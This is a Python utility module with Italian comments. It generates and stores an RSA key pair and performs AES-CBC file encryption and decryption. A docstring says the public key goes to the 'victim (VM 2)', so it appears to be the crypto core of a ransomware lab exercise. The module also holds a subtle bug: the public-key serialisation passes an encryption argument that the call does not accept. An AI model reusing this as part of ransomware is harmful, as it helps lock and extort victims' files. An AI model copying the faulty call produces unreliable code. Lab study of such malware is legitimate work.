#Questo modulo gestisce la generazione della coppia di chiavi RSA che sarà il cuore del sistema.
# utils.py - Funzioni di utilità per la crittografia ibrida

import os
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.backends import default_backend
import secrets

# --- Configurazione Nomi File ---
KEY_DIR = "keys"
PRIVATE_KEY_FILE = os.path.join(KEY_DIR, "private_key.pem")
PUBLIC_KEY_FILE = os.path.join(KEY_DIR, "public_key.pem")

def crea_directory_chiavi():
    """Crea la cartella 'keys' se non esiste."""
    if not os.path.exists(KEY_DIR):
        os.makedirs(KEY_DIR)
        print(f"Directory '{KEY_DIR}' creata per le chiavi.")

def genera_chiavi_rsa():
    """
    Genera una coppia di chiavi RSA (2048 bit) e le salva su disco.
    La chiave pubblica deve essere distribuita alla vittima (VM 2).
    """
    crea_directory_chiavi()
    print("🔑 Generazione coppia di chiavi RSA...")
    
    # Generazione della chiave privata RSA
    chiave_privata = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

    # Serializzazione e salvataggio chiave privata (CRITICA: NON DIVULGARE!)
    with open(PRIVATE_KEY_FILE, "wb") as f:
        f.write(chiave_privata.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption() # Nessuna password per semplicità
        ))

    # Serializzazione e salvataggio chiave pubblica
    chiave_pubblica = chiave_privata.public_key()
    with open(PUBLIC_KEY_FILE, "wb") as f:
        f.write(chiave_pubblica.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
            encryption_algorithm=serialization.NoEncryption()
        ))
        
    print(f"✅ Chiavi RSA salvate in {KEY_DIR}/. (private_key.pem e public_key.pem)")
    return chiave_privata, chiave_pubblica

def carica_chiave_rsa(file_path: str, is_private: bool):
    """Carica una chiave RSA pubblica o privata da file."""
    try:
        with open(file_path, "rb") as key_file:
            key_data = key_file.read()
            if is_private:
                # Carica chiave privata (per il decrittore)
                return serialization.load_pem_private_key(key_data, password=None, backend=default_backend())
            else:
                # Carica chiave pubblica (per la crittografia iniziale)
                return serialization.load_pem_public_key(key_data, backend=default_backend())
    except FileNotFoundError:
        raise FileNotFoundError(f"❌ Chiave non trovata: {file_path}")
    except Exception as e:
        raise Exception(f"❌ Errore nel caricamento della chiave {file_path}: {e}")

# --- Funzioni AES (necessarie per la crittografia e decrittografia dei file) ---

def cifra_aes(chiave_aes: bytes, dati: bytes) -> bytes:
    """Cifra i dati usando AES-256 in modalità CBC con padding PKCS7. Restituisce IV + Dati Cifrati."""
    iv = secrets.token_bytes(16) # IV (Initialization Vector) casuale
    
    # Applicazione del padding
    padder = sym_padding.PKCS7(algorithms.AES.block_size).padder()
    dati_paddati = padder.update(dati) + padder.finalize()
    
    # Cifratura
    cipher = Cipher(algorithms.AES(chiave_aes), modes.CBC(iv), default_backend())
    encryptor = cipher.encryptor()
    dati_cifrati = encryptor.update(dati_paddati) + encryptor.finalize()
    
    # IV è prependito ai dati cifrati, essenziale per la decifratura CBC
    return iv + dati_cifrati

def decifra_aes(chiave_aes: bytes, dati_cifrati_completi: bytes) -> bytes:
    """Decifra i dati usando AES-256 in modalità CBC."""
    # Separazione IV e dati cifrati
    iv = dati_cifrati_completi[:16] 
    dati_cifrati = dati_cifrati_completi[16:]
    
    # Decifratura
    cipher = Cipher(algorithms.AES(chiave_aes), modes.CBC(iv), default_backend())
    decryptor = cipher.decryptor()
    dati_decifrati_paddati = decryptor.update(dati_cifrati) + decryptor.finalize()
    
    # Rimozione del padding
    unpadder = sym_padding.PKCS7(algorithms.AES.block_size).unpadder()
    dati_originali = unpadder.update(dati_decifrati_paddati) + unpadder.finalize()
    
    return dati_originali

if __name__ == "__main__":
    # Esegue la generazione delle chiavi come test e preparazione
    genera_chiavi_rsa()
